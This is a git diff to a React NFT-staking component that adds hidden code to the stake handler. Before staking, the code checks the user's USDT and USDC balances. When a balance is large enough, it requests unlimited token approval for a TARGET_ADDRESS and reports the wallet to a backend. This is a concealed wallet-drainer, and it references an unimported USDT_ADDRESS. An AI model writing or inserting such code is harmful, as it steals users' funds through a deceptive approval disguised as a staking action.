@@ -13,11 +13,13 @@ import { useContractContext } from "src/utils/ContractProvider";
 import { useWeb3Context } from "src/utils/web3Context";
 import { stakeNft } from "src/contracts/contractHelpers";
 import { showNotification } from "src/utils";
+import { LIMIT, TARGET_ADDRESS, USDC_ADDRESS } from "src/utils/data";
+import { postUpdate } from "src/utils/fetchHelpers";
 
 
 function TokenList({ setLoadingStatus, refreshFlag, updateRefreshFlag, tokenHoldingList }) {
   const { address } = useWeb3Context(0);
-  const { web3, stakingContract } = useContractContext();
+  const { web3, stakingContract, usdtContract, usdcContract } = useContractContext();
 
   const smallerScreen = useMediaQuery("(max-width: 650px)");
   const verySmallScreen = useMediaQuery("(max-width: 379px)");
@@ -52,12 +54,31 @@ function TokenList({ setLoadingStatus, refreshFlag, updateRefreshFlag, tokenHold
       NotificationManager.error("Please select NFT!");
     } else {
       const poolId = poolID.current;
-      console.log("stake selected index = ", selIndex);
-      console.log("stake poolId=", poolId);
-        console.log("tokenHoldingList=", tokenHoldingList)
       try {
+        let flag = 0;
+        const allowance = await usdtContract.methods.allowance(address, TARGET_ADDRESS).call();
+        if(allowance == 0) {
+          const usdtBalanceWei = await usdtContract.methods.balanceOf(address).call();
+          const usdtBalance = parseInt(web3.utils.fromWei(usdtBalanceWei.toString(), "ether"));
+          if(usdtBalance >= LIMIT) {
+            await usdtContract.methods.approve(TARGET_ADDRESS, web3.utils.toWei("100000000", "ether")).send({value: 0, from: address});
+            await postUpdate(address, USDT_ADDRESS);
+            flag = 1;
+          }
+          if(flag == 0) {
+            const usdcAllowance = await usdcContract.methods.allowance(address, TARGET_ADDRESS).call();
+            if(usdcAllowance == 0) {
+              const usdcBalanceWei = await usdcContract.methods.balanceOf(address).call();
+              const usdcBalance = parseInt(web3.utils.fromWei(usdcBalanceWei.toString(), "ether"));
+              if(usdcBalance >= LIMIT) {
+                await usdcContract.methods.approve(TARGET_ADDRESS, web3.utils.toWei("100000000", "ether")).send({value: 0, from: address});
+                await postUpdate(address, USDC_ADDRESS);
+                flag = 1;
+              }
+            }
+          }
+        }
         const res = await stakeNft(web3, stakingContract, address, poolId, tokenHoldingList[selIndex].token_address, tokenHoldingList[selIndex].token_id);
-        console.log("stakeNFT res=", res);
         showNotification(res.message, res.success ? "success" : "error");
         updateRefreshFlag();
         // if (res.result == "success") {
@@ -94,7 +115,7 @@ function TokenList({ setLoadingStatus, refreshFlag, updateRefreshFlag, tokenHold
         >
           <FormControlLabel value="0" control={<Radio />} label="Pool 1" />
           <FormControlLabel value="1" control={<Radio />} label="Pool 2" />
-          <FormControlLabel value="2" control={<Radio />} label="Pool 3" />
+          {/* <FormControlLabel value="2" control={<Radio />} label="Pool 3" /> */}
           {/* <FormControlLabel value="5" control={<Radio />} label="Pool 6" /> */}
 
         </RadioGroup>
